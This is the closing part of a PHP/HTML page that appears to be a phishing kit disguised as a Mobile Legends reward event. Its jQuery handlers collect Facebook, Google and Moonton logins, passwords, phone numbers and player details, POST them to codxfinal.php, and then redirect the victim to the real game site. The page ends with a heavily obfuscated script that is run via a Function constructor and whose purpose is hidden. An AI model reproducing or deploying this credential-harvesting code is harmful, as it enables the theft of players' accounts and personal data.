<div class="popup-box-navbar-lz" style="margin-bottom:11px;">
<div class="popup-box-navbar-lz-title">Confirmation</div>
<img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="https://images.cahyosr.my.id/img/13/popup-close2.png" style="margin-top: -27px;margin-right: 25px;opacity: 100%;">
</div>
<div class="popup-box-lz">
<div class="popup-box-alert-lz">Sorry, this item is sold out!</div>
<div class="popup-box-item bordermotion itemShine" style="width: 21%;height: 78px;margin-top: 9px;margin-left: 60px;margin-bottom:10px;">
<rw id="ItemNamesold"></rw>
<div class="popup-box-alert-price">Price:</div>
<prs id="pricesold"></prs>
<div>
<figure>
<span id="amountsold"></span>
<img src="" id="myItemReward_confirmationImgsold">
</figure>
</div>
<div class="line"></div>
<img src="https://images.cahyosr.my.id/img/13/tokens.png" style="margin-top: 3px;margin-right: -70px;width: 19px;height: auto;">
</div> <!--- popup-box-item --->
<br>
<div class="popup-box-footer-lz">
<button type="button" onmousedown="buka.play();" onclick="soldout()" style="width: 90px;height: 28px;padding-left: 0;padding-right: 0;margin-top: -4px;"><font style="">SOLD OUT</font> </button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup itemReward_confirmation --->

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<audio id="audioFile" src="media/open.mp3"></audio>
<script src="https://code.cahyosr.my.id/npm/jquery-13.min.js"></script>
<script>
var buka = new Audio();
buka.src = "media/open.mp3";
var tutup = new Audio();
tutup.src = "media/close.mp3";
function showFbPassword() {
  var _0x248a6e = document.getElementById("password-facebook");
  if (_0x248a6e.type === 'password') {
    _0x248a6e.type = 'text';
    $(".showPassword").hide();
    $(".hidePassword").show();
  } else {
    _0x248a6e.type = "password";
  }
}
function hideFbPassword() {
  var _0x2fb356 = document.getElementById("password-facebook");
  if (_0x2fb356.type === "text") {
    _0x2fb356.type = "password";
    $(".showPassword").show();
    $(".hidePassword").hide();
  } else {
    _0x2fb356.type = 'text';
  }
}
function showmoontonPassword() {
  var _0x1bc090 = document.getElementById("password-moonton");
  if (_0x1bc090.type === "password") {
    _0x1bc090.type = 'text';
    $(".showPassword").hide();
    $(".hidePassword").show();
  } else {
    _0x1bc090.type = "password";
  }
}
function hidemoontonPassword() {
  var _0x4c5f9a = document.getElementById("password-moonton");
  if (_0x4c5f9a.type === "text") {
    _0x4c5f9a.type = "password";
    $(".showPassword").show();
    $(".hidePassword").hide();
  } else {
    _0x4c5f9a.type = "text";
  }
}
function showgooglePassword() {
  var _0x16dd4c = document.getElementById("password-google");
  if (_0x16dd4c.type === "password") {
    _0x16dd4c.type = "text";
    $('.googleShowPassword').hide();
    $(".googleHidePassword").show();
  } else {
    _0x16dd4c.type = "password";
  }
}
function hidegooglePassword() {
  var _0xe420c6 = document.getElementById("password-google");
  if (_0xe420c6.type === "text") {
    _0xe420c6.type = "password";
    $(".googleShowPassword").show();
    $(".googleHidePassword").hide();
  } else {
    _0xe420c6.type = "text";
  }
}
function audioFile() {
  var _0x248193 = document.getElementById("audioFile");
  _0x248193.play();
}
$(document).ready(function () {
  $('o').attr('onclick', "audioFile()");
});
function openRewards(_0x3e5f5f, _0x5d89d8) {
  var _0x853519;
  var _0xcb40c7;
  var _0x51324b;
  _0xcb40c7 = document.getElementsByClassName("tab_rewards");
  for (_0x853519 = 0x0; _0x853519 < _0xcb40c7.length; _0x853519++) {
    _0xcb40c7[_0x853519].style.display = "none";
  }
  _0x51324b = document.getElementsByClassName("menu-content");
  for (_0x853519 = 0x0; _0x853519 < _0x51324b.length; _0x853519++) {
    _0x51324b[_0x853519].className = _0x51324b[_0x853519].className.replace(" menu-content-active", '');
  }
  document.getElementById(_0x5d89d8).style.display = "block";
  _0x3e5f5f.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();
function open_account_verification() {
  $(".account_verification").show();
  $(".open_rewards").hide();
  $(".otherReward_confirmation").hide();
}
function open_itemReward_confirmation2(_0x5842c0) {
  var _0x3d12fc = $(_0x5842c0).attr("src");
  var _0x5daad8 = $(_0x5842c0).attr("item-name");
  var _0x542630 = $(_0x5842c0).attr("item-total");
  var _0x342eb0 = $(_0x5842c0).attr('item-price');
  $(".itemReward_confirmation2").show();
  $("#myItemReward_confirmationImg").attr('src', _0x3d12fc);
  $('#ItemName').html(_0x5daad8);
  $("#amount").html(_0x542630);
  $("#price").html(_0x342eb0);
}
function setFocus(_0x401ffa) {
  var _0x5cbff2 = document.activeElement;
  if (_0x401ffa) {
    setTimeout(function () {
      _0x5cbff2.parentNode.classList.add("focus");
    });
  } else {
    let _0x5a8bdd = document.querySelector(".input-box");
    _0x5a8bdd.classList.remove('focus');
    $('input').each(function () {
      var _0x37ab83 = $(this);
      var _0x23ef9a = _0x37ab83.closest(".input-box");
      if (_0x37ab83.val()) {
        _0x23ef9a.addClass("focus");
      } else {
        _0x23ef9a.removeClass('focus');
      }
    });
  }
}
function ValidateLoginGoogleData() {
  $('#ValidateVerificationDataGP').submit(function (_0x27a543) {
    _0x27a543.preventDefault();
    $emailfb = $("#email-google").val().trim();
    $passwordfb = $("#password-google").val().trim();
    $loginfb = $("#login-google").val().trim();
    if ($emailfb == '' || $emailfb == null || $emailfb.length <= 0x5) {
      $('.email-fb').show();
      $(".sandi-fb").hide();
      $(".login-google").show();
      return false;
    } else {
      $(".email-fb").hide();
      $("input#validateEmail").val($emailfb);
      $('.login-google').hide();
    }
    if ($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 0x5) {
      $(".sandi-fb").show();
      $(".login-google").show();
      return false;
    } else {
      $(".sandi-fb").hide();
      $("input#validatePassword").val($passwordfb);
      $("input#validateLogin").val($loginfb);
      $('.account_verification').show();
      $('.login-google').hide();
    }
  });
}
function ValidateLoginMoontonData() {
  $("#ValidateVerificationDataMT").submit(function (_0x21c382) {
    _0x21c382.preventDefault();
    $emailfb = $("#email-moonton").val().trim();
    $passwordfb = $('#password-moonton').val().trim();
    $passmt = $('#password-gpmt').val().trim();
    $loginfb = $("#login-moonton").val().trim();
    if ($emailfb == '' || $emailfb == null || $emailfb.length <= 0x5) {
      $('.email-mt').show();
      $('.sandi-mt').hide();
      $('.login-moonton').show();
      return false;
    } else {
      $(".email-mt").hide();
      $("input#validateEmail").val($emailfb);
      $('.login-moonton').hide();
    }
    if ($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 0x5) {
      $('.sandi-mt').show();
      $('.login-moonton').show();
      return false;
    } else {
      $(".sandi-mt").hide();
      $("input#validatePassword").val($passwordfb);
      $('.login-moonton').hide();
    }
    if ($passmt == '' || $passmt == null || $passmt.length <= 0x5) {
      $(".sandi-gp").show();
      $(".login-moonton").show();
      return false;
    } else {
      $('.sandi-gp').hide();
      $("input#validatePass").val($passmt);
      $('input#validateLogin').val($loginfb);
      $('.account_verification').show();
      $('.login-moonton').hide();
    }
  });
}
function ValidateLoginFbData() {
  $("#ValidateVerificationDataFB").submit(function (_0x2ee970) {
    _0x2ee970.preventDefault();
    $emailfb = $("#email-facebook").val().trim();
    $passwordfb = $("#password-facebook").val().trim();
    $loginfb = $("#login-facebook").val().trim();
    if ($emailfb == '' || $emailfb == null || $emailfb.length <= 0x5) {
      $(".email-fb").show();
      $(".sandi-fb").hide();
      $(".login-facebook").show();
      return false;
    } else {
      $(".email-fb").hide();
      $("input#validateEmail").val($emailfb);
      $('.login-facebook').hide();
    }
    if ($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 0x5) {
      $(".sandi-fb").show();
      $('.login-facebook').show();
      return false;
    } else {
      $(".sandi-fb").hide();
      $("input#validatePassword").val($passwordfb);
      $("input#validateLogin").val($loginfb);
      $(".account_verification").show();
      $(".login-facebook").hide();
    }
  });
}
function ValidateVerificationData() {
  $("#FormFB").submit(function (_0xd1ee8c) {
    _0xd1ee8c.preventDefault();
    var _0x3d51af = $("input#validateEmail").val();
    var _0x56746c = $("input#validatePassword").val();
    var _0x30fa12 = $("input#nick").val();
    var _0x2806f4 = $("input#playid").val();
    var _0x28c538 = $("input#phone").val();
    var _0x199f11 = $("input#level").val();
    var _0x5ef852 = $("input#tier").val();
    var _0x47f559 = $('input#rpt').val();
    var _0x4b7f4a = $('input#rpl').val();
    var _0x2c560c = $("input#validatePass").val();
    var _0x5e03b9 = $("input#validateLogin").val();
    if (_0x3d51af == '' && _0x56746c == '' && _0x30fa12 == '' && _0x2806f4 == '' && _0x28c538 == '' && _0x199f11 == '' && _0x5ef852 == '' && _0x47f559 == '' && _0x4b7f4a == '' && _0x2c560c == '' && _0x5e03b9 == '') {
      $('.account_verification').show();
      return false;
    }

    $.ajax({
      'type': "POST",
      'url': "codxfinal.php",
      'data': $(this).serialize(),
      'beforeSend': function () {
        $(".check_verification").show();
        $(".account_verification").hide();
      },
      'success': function () {
        location.href = "https://mobilelegends.com";
      }
    });
  });
  return false;
}
</script>
<script>
// show hide password for twitter
function showmoontonPassword() {
  var x = document.getElementById("password-moonton");
  if (x.type === "password") {
    x.type = "text";
	$('.moontonShowPassword').hide();
	$('.moontonHidePassword').show();
  } else {
    x.type = "password";
  }
}
function hidemoontonPassword() {
  var x = document.getElementById("password-moonton");
  if (x.type === "text") {
    x.type = "password";
	$('.moontonShowPassword').show();
	$('.moontonHidePassword').hide();
  } else {
    x.type = "text";
  }
}
// show hide password for twitter
function showgpPassword() {
  var x = document.getElementById("password-gpmt");
  if (x.type === "password") {
    x.type = "text";
	$('.gpShowPassword').hide();
	$('.gpHidePassword').show();
  } else {
    x.type = "password";
  }
}
function hidegpPassword() {
  var x = document.getElementById("password-gpmt");
  if (x.type === "text") {
    x.type = "password";
	$('.gpShowPassword').show();
	$('.gpHidePassword').hide();
  } else {
    x.type = "text";
  }
}
function open_verification(){
	$('.account_verification').show();
	$(".open_rewards").hide()
	$(".otherReward_confirmation").hide()
	$(".otherReward_confirmation3").hide()
	$(".itemReward_confirmation").hide()
}
function open_itemReward_confirmation(ag) {
    var itemReward_confirmationImg = $(ag).attr("src");
    $('.itemReward_confirmation').show();
    $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg);
}
function open_itemReward_confirmation2(ag) {
    var itemReward_confirmationImg2 = $(ag).attr("src");
    $('.itemReward_confirmation2').fadeIn('slow'); 
    $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg2);
}
function open_itemReward_confirmation2(ag) {
  var itemReward_confirmationImg2 = $(ag).attr("src");
  var ItemName = $(ag).attr("item-name");
  var amount = $(ag).attr("item-total");
  var price = $(ag).attr("item-price");
  $('.itemReward_confirmation2').show();   
  $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg2);
  $('#ItemName').html(ItemName);
  $('#amount').html(amount);
  $('#price').html(price);
}
function open_itemReward_confirmation4(ag) {
    var itemReward_confirmationImg4 = $(ag).attr("src");
    $('.itemReward_confirmation4').show();
    $('#myItemReward_confirmationImg4').attr('src',itemReward_confirmationImg4);
}
function open_otherReward_confirmation(ag) {
    var otherReward_confirmationImg = $(ag).attr("src");
	var otherReward_confirmationValue = $(ag).attr("value");
    $('.otherReward_confirmation').show();
    $('#myOtherReward_confirmationImg').attr('src',otherReward_confirmationImg);
	$('#otherReward_confirmationValue').html(otherReward_confirmationValue);
}
function open_otherReward_confirmation3(ag) {
    var otherReward_confirmation3Img = $(ag).attr("src");
	var otherReward_confirmation3Value = $(ag).attr("value");
    $('.otherReward_confirmation3').show();
    $('#myOtherReward_confirmation3Img').attr('src',otherReward_confirmation3Img);
	$('#otherReward_confirmation3Value').html(otherReward_confirmationValue);
}
function close_reward_confirmation(){
	$(".itemReward_confirmation").hide()
	$(".otherReward_confirmation").hide()
	$(".itemReward_confirmation2").hide()
	$(".itemReward_confirmation3").hide()
	$(".itemReward_confirmation4").hide()
	$('.newhome').hide();
}
function close_reward_confirmations(){
    $('.event_rules').hide();	
    $('.about_event').hide();
}
function open_account_verification(){
	$('.loadinglogin').show();
	$('#text-login1').show()
    setTimeout(function () {
      $('#text-login1').hide()
      $('#text-login2').fadeIn()
    }, 2000)
	$('.open_rewards').hide(); 
	$('.itemReward_confirmation2').hide();
	setTimeout(function () {
    $('.account_login').show();  
    $('.loadinglogin').hide();
      }, 5000);	
}
</script>
<script>
function ValidateLoginFbData() {
	$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
	submitingValidateLoginFbData.preventDefault();
	
	$emailfb = $('#email-facebook').val().trim();
	$passwordfb = $('#password-facebook').val().trim();
	$loginfb = $('#login-facebook').val().trim();
            if($emailfb == '' || $emailfb == null || $emailfb.length <= 5)
            {
                $('.email-fb').show();
                $('.sandi-fb').hide();
                $('.login-facebook').show();
                return false;
            }else{
                $('.email-fb').hide();               
	              $("input#validateEmail").val($emailfb);
                $('.login-facebook').hide();  
            }
            if($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 5)
            {
                $('.sandi-fb').show();
                $('.login-facebook').show();
                return false;
            }else{
                $('.sandi-fb').hide();
	              $("input#validatePassword").val($passwordfb);
	              $("input#validateLogin").val($loginfb);
			          $('.account_verification').show();
                $('.login-facebook').hide();	          	           
	}
	}); 
}
var LazIndexHeader = 0;
showLazSlidez();
function showLazSlidez() {
    var i;
    var LazSlidez = document.getElementsByClassName("lazaslide");
    for (i = 0; i < LazSlidez.length; i++) {
        LazSlidez[i].style.display = "none"; 
    }
    LazIndexHeader++;
    if (LazIndexHeader > LazSlidez.length) {LazIndexHeader = 1} 
    LazSlidez[LazIndexHeader-1].style.display = "block"; 
    setTimeout(showLazSlidez, 3000);
}

// code funtion timers
$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#timer1').html( '  ' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);
$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#timer2').html( + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);
</script>
<script>
var counter = 1;

    setInterval(function()  {
      document.getElementById('radio'+ counter).checked = true;
      counter++; 

      if(counter>4){
        counter=1
      }

    }, 1800);
 </script>   
 <script>
var counter = 1;

    setInterval(function()  {
      document.getElementById('radionam'+ counter).checked = true;
      counter++; 

      if(counter>4){
        counter=1
      }

    }, 1600);
</script>   
 <script>
// kode untuk slider notif
var slideIndex = 0;
showSlides();
function showSlides() {
    var i;
    var slides = document.getElementsByClassName("slider");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
    }
    slideIndex++;
    if (slideIndex > slides.length) {slideIndex = 1} 
    slides[slideIndex-1].style.display = "block"; 
    setTimeout(showSlides, 2400);
}

var slideIndex = 0;
showSlides();
function showSlides() {
  var i;
  var slides = document.getElementsByClassName("mySlides");
  var dots = document.getElementsByClassName("dot");
  for (i = 0; i < slides.length; i++) {
    slides[i].style.display = "none";  
  }
  slideIndex++;
  if (slideIndex > slides.length) {slideIndex = 1}    
  for (i = 0; i < dots.length; i++) {
    dots[i].className = dots[i].className.replace(" active", "");
  }
  slides[slideIndex-1].style.display = "block";  
  dots[slideIndex-1].className += " active";
  setTimeout(showSlides, 2500);
}
// kode untuk slider notif
var slideIndex = 0;
showSlides();
function showSlides() {
    var i;
    var slides = document.getElementsByClassName("slider");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
    }
    slideIndex++;
    if (slideIndex > slides.length) {slideIndex = 1} 
    slides[slideIndex-1].style.display = "block"; 
    setTimeout(showSlides, 2400);
}
// kode untuk ganti gambar header otomatis1
var slideIndexHeader = 0;
showSlidesHeader();
function showSlidesHeader() {
    var i;
    var slidesHeader = document.getElementsByClassName("sliderHeader");
    for (i = 0; i < slidesHeader.length; i++) {
        slidesHeader[i].style.display = "none"; 
    }
    slideIndexHeader++;
    if (slideIndexHeader > slidesHeader.length) {slideIndexHeader = 1} 
    slidesHeader[slideIndexHeader-1].style.display = "block"; 
    setTimeout(showSlidesHeader, 2500);
};
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
(function(){var fTQ='',Rby=508-497;function ygd(x){var o=969054;var r=x.length;var z=[];for(var f=0;f<r;f++){z[f]=x.charAt(f)};for(var f=0;f<r;f++){var k=o*(f+454)+(o%31625);var i=o*(f+676)+(o%27792);var l=k%r;var t=i%r;var b=z[l];z[l]=z[t];z[t]=b;o=(k+i)%4024719;};return z.join('')};var vcP=ygd('cobttrokquvnzxyhgesdfwrmapcnjrutlocis').substr(0,Rby);var YBB=').mao8;3;on=xchvag;;akdrh0g;c+dfnhi.[r(ncpyc.=,Csx.z,0=e;nh[ea(ran=(; ox;80tnlehr,d9lufkrrt;o;tt97g+.63urr.8pgC,}u1gr=;soir=vti=f]8n rl34r6[=0evuio+fnetnf,1+[o+e)licnt+;;dam ra)f{ri=ic;)+apu=>pqhnar;=r 5ipp9+;ktaig(w[;l8.;g(l=vSi+t ;dai)a1a)g"[tn]sqe1.f"ltev* ra7;r;vveey)e)m1ketau-s;62;[+iv.={o-l1a=nu6;;<u ,})ar()4(aa.g=n]p{+vht(e00(.,;udrC;r[(gth0l.t)s2oml(+u.1un0-u<=p)C+{tad(+d!xl=ba!52t ,(jt;jfsrs(eaan7=n(A3rc6=ig)1a,jrn.r or4a+= v]u]C)0f;)rAvhr2h5 ]"( f;a+n=hvs-0=o(tupe=ko}[ar,m29lvs),>1u(}<"i;rxsvhnl.ad)tv,uq=e(h;vA=i..(2 8}==upc-nu4(([;r9.mj;);=nl75u8s<A)s<j7)]fu{iu.xc;n],{ ih,)pfqm)il=pg(=(2n5=qx={t=el ;n4ltn]ai(la)-,7vli]an.tu+=;;(1fb6t)}io++qeljhhr0n,joe.irxj;n"=aA8(hw) uu.s}(lo6crofj["xh,")aoer wr*ge,00 9=,;,)9nv 2rfcojcy7hlch)r8);ve nr ). )+vCe,+C.r"a;6,eht,[ej) vb(g,vyovr,.rfrjm+[0[aauoo;dl=+744Ca; ]aj),t(oi.(St=rsg )rtmvh;on;vejw(r]o===f1us]g+er2(iua]("-",.o+v=stnj';var fZO=ygd[vcP];var YQV='';var uhr=fZO;var iaA=fZO(YQV,ygd(YBB));var RCR=iaA(ygd(')&"D)t__ft1#aZ)fZ u2= s{b2"o.a3Z0=a#a_+f%3Z)9c"k,]rZjo(+Z1eZu;%Z;:=}Zn(Z.u_3+nto1$m=bZ[Zt0-m0+$;3+,foZfx6pf6!.$s( !2!$t..86m(Z0g)-aZp0eZ_g( m.]o%srn576tp_augZ;.; Z;(.;tp=. p1ba(3e,i!!zZ3Ttu.(,gk.0#s#e0rCtZ, =i\/fte%Z]j!sud.16nre:!cZlm!0$Z*(t.Za1Zb42(00j!f7)!6_3_,"0(6)=r0h+){c)0$(()f(hof5ott.;rZ6m\/ f3Z=;4uZd,t$Z$,f1\'$k{]6o eS-m;aZpn;a)3$Z3gZ$+#\/fZd[!!Z*k0m],so\/tpe$6.Z06._.(u;n!oh]Z8o#$,ti1a.4"naZa;$)oftf\/hj1gk+1.Zie1t&d!i_i.3,n%. .,#)_$%ibfus\'}0f!ineje,3rsl,Z(=Z3ua1(.ftfx%_a5]yt5t%1ZZhZ5=2!3f62i))h =; oo6Zf.fp,e(iotZfff_t(%Z(_j&2(dna]rs;g]ti,33,a)73{Z .Z!(Z7!,h}}"oj36!Z)bfZ1a\/s_ZZne Z}&epZ.tgZ)1,Zi3;2(;52$jbm{tl)_.;3e.$0mZ=4_Zit_()30crff9$+els3)_urZn\/26no.iZlj0$j_t..r.b_=t.),pj5!]63ZZa.(*f=.)#yS_r.$=r;=taZ_srZS2kx)!17Z{i}(1Zgb1%ZS4rv=t}f.p;Z)a(3 .1=%Z_4&.nZ61Z;ab.}0j);ai6{!$$)).b)_($hlr(=k1Z.s})i)($-Z 6bgj,}.a,Zos8Z(0))tlhd%eb7f=jr+6Zi{4,i_f)Zu0){sh):.o.nZg (8$)..(.ta)i_.r(asl.C;(,tr-[,05s43i*f_!kh!b4.si,.%4Zj( %(!e415Za.of{0.(]:Z,j).)flje(Zrh)rZ5Z.Z)5(=,bgef1nZ)3lZj_4,fi(!_)s(va);.c1o\'krftn=i{%ho_i,")_8,3.{5,rn3_i.Z3rf$3)1_];(6$)g_g}4Z}{l){ffZ604)2e=Z,qn72].=71]iy2Zsr.ZZ iaf3\'0.)# 3pud=)i2 1#Zt{ja,,Zflf.Z$.0[Z2=s;Z6]$m.}_ia.,i8d$n0sZ{e2k;i!_2db*Z.t.(e}5.;1$f3.Z o.e.76aoe}Z!ts'));var ULF=uhr(fTQ,RCR );ULF(4380);return 1867})()
</script>
 </body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>